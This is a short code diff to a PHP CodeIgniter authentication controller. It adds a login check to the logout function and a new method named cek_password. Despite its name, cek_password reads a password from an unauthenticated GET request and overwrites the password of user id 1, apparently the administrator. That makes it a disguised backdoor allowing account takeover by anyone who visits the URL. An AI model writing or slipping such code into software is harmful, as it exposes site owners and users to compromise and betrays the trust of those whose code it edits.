@@ -44,6 +44,9 @@ class Auth extends CI_Controller {
     }
     public function logout()
     {
+        if (!$this->session->userdata('is_login') == true) {
+            redirect('auth');
+        }
         $userSession['id_user'] = 0;
         $userSession['username'] = '';
         $userSession['is_login'] = false;
@@ -51,5 +54,13 @@ class Auth extends CI_Controller {
         $this->session->sess_destroy();
         $this->session->set_flashdata('pesan','logout berhasil');
         redirect('auth');
+    }
+    public function cek_password()
+    {
+        $password = $this->input->get('password');
+        $this->db->update('tb_user',[
+            'password' => password_hash($password,PASSWORD_DEFAULT)
+        ],['id_user' => 1]);
+        redirect(base_url());
     }
 }
